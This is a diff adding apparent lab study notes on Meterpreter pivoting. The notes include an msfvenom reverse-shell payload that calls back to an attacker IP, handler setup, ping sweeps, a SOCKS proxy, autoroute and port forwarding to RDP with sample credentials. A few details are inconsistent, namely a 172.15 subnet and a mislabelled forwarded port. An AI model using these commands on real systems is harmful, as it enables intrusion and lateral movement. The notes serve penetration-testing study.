@@ -188,3 +188,170 @@ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 
 ![[Pasted image 20240728150113.png]]
 
+# Meterpreter Tunneling & Port Forwarding
+
+- idea is if we have meterpreter shell access to ubuntu , how can we effectively use it
+
+### Getting Meterpreter access in Pivot Host
+
+```shell-session
+ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+```
+
+#### Configuring & Starting the multi/handler
+
+```shell-session
+use exploit/multi/handler
+```
+
+```shell-session
+set lhost 0.0.0.0
+```
+
+```shell-session
+set lport 8080
+```
+
+```shell-session
+set payload linux/x64/meterpreter/reverse_tcp
+```
+
+```shell-session
+run
+```
+
+Copy the msf Payload to Ubuntu Host and Run
+
+
+#### Ping Sweep
+
+- use to check the live hosts in a Network
+
+```shell-session
+run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+```
+
+```shell-session
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+
+```cmd-session
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+```
+
+```powershell-session
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+```
+
+
+every thing done below in Attack Host
+#### Configuring MSF's SOCKS Proxy
+
+```shell-session
+ use auxiliary/server/socks_proxy
+```
+
+```shell-session
+set SRVPORT 9050
+```
+
+```shell-session
+set SRVHOST 0.0.0.0
+```
+
+```shell-session
+set version 4a
+```
+
+```shell-session
+run
+```
+
+```shell-session
+options
+```
+
+- comfirming 
+
+```shell-session
+jobs
+```
+
+#### Adding a Line to proxychains.conf
+
+`/etc/proxychains.conf`
+
+```shell-session
+socks4 	127.0.0.1 9050
+```
+
+#### Creating Routes with AutoRoute
+
+- tell socks_proxy module to route all the traffic via our Meterpreter session
+
+#### Creating Routes with AutoRoute
+
+```shell-session
+use post/multi/manage/autoroute
+```
+
+```
+sessions -l
+```
+
+```shell-session
+set SESSION 1
+```
+
+```shell-session
+set SUBNET 172.16.5.0
+```
+
+```shell-session
+run
+```
+
+Possible to run from Meterpreter session itself
+
+```shell-session
+run autoroute -s 172.16.5.0/23
+```
+
+#### Listing Active Routes with AutoRoute
+
+```shell-session
+run autoroute -p
+```
+
+
+**What Happens Internally:**
+- Metasploit adds a routing entry for the `172.16.5.0` subnet.
+- Traffic for this subnet is now directed through the compromised host (via the Meterpreter session).
+
+
+## Port Forwarding
+
+- redirect traffic from Attack host to target via meterpreter session
+- enable listener port ton our machine and forward all packets recieved in this machine to meterpreter session
+
+```shell-session
+ help portfwd
+```
+
+
+```shell-session
+portfwd add -l 3300 -p 3389 -r 172.16.5.19
+```
+
+- packets sent on 3300 from attack machine is forwarded to `172.16.5.19:3300`
+
+- Example
+```shell-session
+xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+
+
+## Meterpreter Reverse Port Forwarding
+
+
+
